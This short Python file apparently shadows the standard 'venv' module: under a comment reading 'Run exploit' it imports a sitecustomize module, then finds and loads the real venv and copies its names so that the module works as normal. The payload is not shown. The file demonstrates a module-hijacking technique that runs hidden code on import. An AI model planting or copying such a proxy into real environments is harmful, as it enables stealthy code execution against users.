import sys
import os
import importlib.util
import importlib.machinery

# Run exploit
try:
    import sitecustomize
except ImportError:
    pass

# Proxy to real module
name = 'venv'
current_dir = os.path.dirname(os.path.abspath(__file__))
# Get path without current_dir to find the real module
path = [p for p in sys.path if p not in (current_dir, '')]

finder = importlib.machinery.PathFinder()
spec = finder.find_spec(name, path)
if spec:
    real_mod = importlib.util.module_from_spec(spec)
    sys.modules[name] = real_mod
    spec.loader.exec_module(real_mod)
    globals().update(vars(real_mod))
